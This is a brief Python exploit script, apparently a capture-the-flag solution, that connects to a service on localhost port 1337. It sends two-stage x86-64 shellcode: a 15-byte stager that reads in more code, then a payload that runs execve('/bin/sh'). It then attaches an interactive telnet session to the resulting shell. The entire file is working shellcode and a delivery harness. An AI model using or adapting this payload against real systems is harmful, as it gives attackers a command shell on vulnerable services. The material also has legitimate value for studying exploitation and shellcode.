#!/usr/bin/python
import struct
import socket
import telnetlib

addr = ('127.0.0.1',1337)
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

s.connect(addr)

#stage1 - 15 bytes
stage1 = ("\x48\x31\xc0\x50\x5f\x48\x83\xc6\x0f\x50\x5a\xb2\x64\x0f\x05")
#stage2 - execve /bin/sh
stage2 = ("\x48\x31\xd2\x48\xbb\xff\x2f\x62\x69\x6e\x2f\x73\x68\x48\xc1\xeb\x08\x53\x48\x89\xe7\x48\x31\xc0\x50\x57\x48\x89\xe6\xb0\x3b\x0f\x05")

s.send(stage1+stage2)

t = telnetlib.Telnet()
t.sock = s
t.interact()

s.close()
